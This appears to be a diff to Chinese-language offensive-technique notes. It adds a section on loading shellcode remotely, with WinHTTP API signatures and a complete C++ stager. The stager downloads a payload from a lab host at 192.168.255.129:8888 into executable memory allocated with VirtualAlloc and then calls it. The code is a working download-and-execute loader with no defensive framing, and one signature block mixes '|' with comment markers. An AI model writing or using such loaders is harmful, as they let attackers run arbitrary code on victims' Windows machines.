@@ -302,7 +302,118 @@ int main(void) {
 
 ```
 
-
-
 ### 远程加载shellcode
+
+#### 核心函数
+
+##### WinHttpOpen
+
+https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen
+
+`WinHttpOpen` 函数初始化应用程序的 WinHTTP 函数的使用，并返回 WinHTTP 会话句柄。
+
+```
+HINTERNET WinHttpOpen(
+  LPCWSTR pszUserAgent,          // 用户代理字符串（标识客户端）
+  DWORD   dwAccessType,          // 代理访问类型（是否使用代理）
+  LPCWSTR pszProxyName,          // 自定义代理服务器地址
+  LPCWSTR pszProxyBypass,        // 代理绕过列表（不经过代理的地址）
+  DWORD   dwFlags                // 特殊标志（通常设为0）
+);
+```
+
+##### WinHttpConnect
+
+https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
+
+**`WinHttpConnect`** 函数指定 HTTP 请求的初始目标服务器，并将 [HINTERNET](https://learn.microsoft.com/en-us/windows/desktop/WinHttp/hinternet-handles-in-winhttp) 连接句柄返回到该初始目标的 HTTP 会话。
+
+```
+HINTERNET WinHttpConnect(
+  HINTERNET     hSession,      // `WinHttpOpen` 返回的会话句柄
+  LPCWSTR       pswzServerName,// 目标服务器（域名或IP）
+  INTERNET_PORT nServerPort,   // 目标端口
+  DWORD         dwReserved     // 保留参数（必须为0）
+);
+```
+
+##### WinHttpOpenRequest
+
+https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest
+
+`WinHttpOpenRequest`创建一个 HTTP 请求句柄（`HINTERNET`），用于发送和接收 HTTP 请求。
+
+```
+HINTERNET WinHttpOpenRequest(
+  HINTERNET hConnect,         // `WinHttpConnect` 返回的连接句柄
+  LPCWSTR   pwszVerb,         // HTTP 方法（GET/POST）
+  LPCWSTR   pwszObjectName,   // URL 路径或文件名（如 `L"/api"`）
+  LPCWSTR   pwszVersion,      // HTTP 版本（NULL=默认HTTP/1.1）
+  LPCWSTR   pwszReferer,      | Referer 头（通常不发送）
+  LPCWSTR   *ppwszAcceptTypes,| 支持的 MIME 类型（默认接受所有）
+  DWORD     dwFlags           | 特殊标志（通常0）
+);
+
+```
+
+##### WinHttpSendRequest
+
+https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
+
+**`WinHttpSendRequest`** 函数将指定的请求发送到 HTTP 服务器。
+
+```
+BOOL WinHttpSendRequest(
+  HINTERNET hRequest,          // `WinHttpOpenRequest` 返回的请求句柄
+  LPCWSTR   lpszHeaders,       // 附加 HTTP 头（通常不发送）
+  DWORD     dwHeadersLength,   // 自定义头的长度（通常0）
+  LPVOID    lpOptional,        // POST 请求体（GET 设为 NULL）
+  DWORD     dwOptionalLength,  // POST 数据长度（GET=0）
+  DWORD     dwTotalLength,     // 请求总大小（GET=0）
+  DWORD_PTR dwContext          // 回调上下文（通常0）
+);
+```
+
+#### 代码讲解
+
+```c++
+#include <windows.h>
+#include <stdint.h>
+#include <winhttp.h>
+#pragma comment(lib,"winhttp")
+
+int main()
+{
+	void* exec;
+	int payload_len = 4096;
+
+	wchar_t host[] = L"192.168.255.129";// 目标主机IP
+	WORD port = 8888;// 目标端口
+	wchar_t  path[] = L"/calc.bin";// 要请求的资源路径
+	// WinHTTP相关句柄
+	HINTERNET   session;
+	HINTERNET   conn;
+	HINTERNET   reqfile;
+	DWORD       nread;
+	//分配可读写执行的内存区域用于存储shellcode
+	exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	//使用默认设置创建会话
+	session = WinHttpOpen(L"Mozilla/4.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	//连接到目标主机
+	conn = WinHttpConnect(session, host, port, 0);
+	//创建请求
+	reqfile = WinHttpOpenRequest(conn, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+	//发送请求并读取响应
+	WinHttpSendRequest(reqfile, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+	WinHttpReceiveResponse(reqfile, NULL);
+	WinHttpReadData(reqfile, exec, payload_len, &nread);
+
+	((void(*)())exec)();
+
+	//关闭所有句柄
+	WinHttpCloseHandle(reqfile);
+	WinHttpCloseHandle(conn);
+	WinHttpCloseHandle(session);
+}
+```
 
